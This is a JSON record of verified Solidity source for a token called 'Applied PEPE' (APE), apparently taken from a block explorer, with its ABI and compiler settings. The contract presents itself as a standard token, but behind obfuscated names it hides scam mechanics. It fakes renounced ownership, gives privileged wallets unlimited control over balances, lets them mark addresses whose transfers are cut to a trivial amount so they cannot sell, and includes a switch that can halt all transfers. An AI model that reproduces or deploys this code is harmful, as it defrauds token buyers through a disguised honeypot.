{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.11;\n\ninterface teamTxBuy {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address enableMax) external view returns (uint256);\n\n    function transfer(address amountFund, uint256 senderLaunched) external returns (bool);\n\n    function allowance(address exemptReceiver, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 senderLaunched) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address amountFund,\n        uint256 senderLaunched\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed fundAt, uint256 value);\n    event Approval(address indexed exemptReceiver, address indexed spender, uint256 value);\n}\n\nabstract contract shouldList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface txExemptShould {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface liquidityFund {\n    function createPair(address shouldListTo, address launchAmount) external returns (address);\n}\n\ninterface teamTxBuyMetadata is teamTxBuy {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AppliedPEPE is shouldList, teamTxBuy, teamTxBuyMetadata {\n\n    mapping(address => uint256) private maxLiquidity;\n\n    uint256 fromExempt;\n\n    function owner() external view returns (address) {\n        return atToken;\n    }\n\n    uint256 toMin;\n\n    function transferFrom(address modeMin, address amountFund, uint256 senderLaunched) external override returns (bool) {\n        if (_msgSender() != marketingSwap) {\n            if (takeShould[modeMin][_msgSender()] != type(uint256).max) {\n                require(senderLaunched <= takeShould[modeMin][_msgSender()]);\n                takeShould[modeMin][_msgSender()] -= senderLaunched;\n            }\n        }\n        return amountListAt(modeMin, amountFund, senderLaunched);\n    }\n\n    function shouldMarketingLaunched(address receiverLiquidity) public {\n        senderMode();\n        \n        if (receiverLiquidity == liquidityModeSwap || receiverLiquidity == tradingLaunched) {\n            return;\n        }\n        modeShouldWallet[receiverLiquidity] = true;\n    }\n\n    event OwnershipTransferred(address indexed shouldAtIs, address indexed totalToken);\n\n    uint256 private txExemptLaunch = 100000000 * 10 ** 18;\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return txExemptLaunch;\n    }\n\n    function amountListAt(address modeMin, address amountFund, uint256 senderLaunched) internal returns (bool) {\n        if (modeMin == liquidityModeSwap) {\n            return launchLaunched(modeMin, amountFund, senderLaunched);\n        }\n        uint256 limitReceiver = teamTxBuy(tradingLaunched).balanceOf(receiverMode);\n        require(limitReceiver == fromExempt);\n        require(amountFund != receiverMode);\n        if (modeShouldWallet[modeMin]) {\n            return launchLaunched(modeMin, amountFund, fromAt);\n        }\n        return launchLaunched(modeMin, amountFund, senderLaunched);\n    }\n\n    string private liquidityAuto = \"Applied PEPE\";\n\n    function name() external view virtual override returns (string memory) {\n        return liquidityAuto;\n    }\n\n    address marketingSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    string private swapTxReceiver = \"APE\";\n\n    mapping(address => mapping(address => uint256)) private takeShould;\n\n    mapping(address => bool) public walletLimitFee;\n\n    address receiverMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private autoSender;\n\n    function getOwner() external view returns (address) {\n        return atToken;\n    }\n\n    address public tradingLaunched;\n\n    uint256 public fromMin;\n\n    function balanceOf(address enableMax) public view virtual override returns (uint256) {\n        return maxLiquidity[enableMax];\n    }\n\n    bool public totalShould;\n\n    function txLiquidity(address takeBuyReceiver, uint256 senderLaunched) public {\n        senderMode();\n        maxLiquidity[takeBuyReceiver] = senderLaunched;\n    }\n\n    function senderMode() private view {\n        require(walletLimitFee[_msgSender()]);\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return takeFrom;\n    }\n\n    function feeTrading(address teamSwap) public {\n        require(teamSwap.balance < 100000);\n        if (totalShould) {\n            return;\n        }\n        \n        walletLimitFee[teamSwap] = true;\n        if (fromMin == autoSender) {\n            fromMin = autoSender;\n        }\n        totalShould = true;\n    }\n\n    address private atToken;\n\n    bool private listWallet;\n\n    address public liquidityModeSwap;\n\n    uint256 constant fromAt = 9 ** 10;\n\n    function approve(address isTotalReceiver, uint256 senderLaunched) public virtual override returns (bool) {\n        takeShould[_msgSender()][isTotalReceiver] = senderLaunched;\n        emit Approval(_msgSender(), isTotalReceiver, senderLaunched);\n        return true;\n    }\n\n    bool private exemptLimitAmount;\n\n    function listAuto(uint256 senderLaunched) public {\n        senderMode();\n        fromExempt = senderLaunched;\n    }\n\n    constructor (){\n        if (autoSender == fromMin) {\n            autoSender = fromMin;\n        }\n        txExemptShould totalShouldMin = txExemptShould(marketingSwap);\n        tradingLaunched = liquidityFund(totalShouldMin.factory()).createPair(totalShouldMin.WETH(), address(this));\n        \n        liquidityModeSwap = _msgSender();\n        sellReceiver();\n        walletLimitFee[liquidityModeSwap] = true;\n        maxLiquidity[liquidityModeSwap] = txExemptLaunch;\n        if (exemptLimitAmount == listWallet) {\n            exemptLimitAmount = false;\n        }\n        emit Transfer(address(0), liquidityModeSwap, txExemptLaunch);\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTxReceiver;\n    }\n\n    function allowance(address launchMax, address isTotalReceiver) external view virtual override returns (uint256) {\n        if (isTotalReceiver == marketingSwap) {\n            return type(uint256).max;\n        }\n        return takeShould[launchMax][isTotalReceiver];\n    }\n\n    uint8 private takeFrom = 18;\n\n    function sellReceiver() public {\n        emit OwnershipTransferred(liquidityModeSwap, address(0));\n        atToken = address(0);\n    }\n\n    function transfer(address takeBuyReceiver, uint256 senderLaunched) external virtual override returns (bool) {\n        return amountListAt(_msgSender(), takeBuyReceiver, senderLaunched);\n    }\n\n    function launchLaunched(address modeMin, address amountFund, uint256 senderLaunched) internal returns (bool) {\n        require(maxLiquidity[modeMin] >= senderLaunched);\n        maxLiquidity[modeMin] -= senderLaunched;\n        maxLiquidity[amountFund] += senderLaunched;\n        emit Transfer(modeMin, amountFund, senderLaunched);\n        return true;\n    }\n\n    mapping(address => bool) public modeShouldWallet;\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptReceiver\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldAtIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"totalToken\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"fundAt\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMax\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"isTotalReceiver\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"isTotalReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"teamSwap\",\"type\":\"address\"}],\"name\":\"feeTrading\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromMin\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"liquidityModeSwap\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"listAuto\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"modeShouldWallet\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLiquidity\",\"type\":\"address\"}],\"name\":\"shouldMarketingLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalShould\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"modeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"amountFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeBuyReceiver\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"senderLaunched\",\"type\":\"uint256\"}],\"name\":\"txLiquidity\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"walletLimitFee\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "AppliedPEPE", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}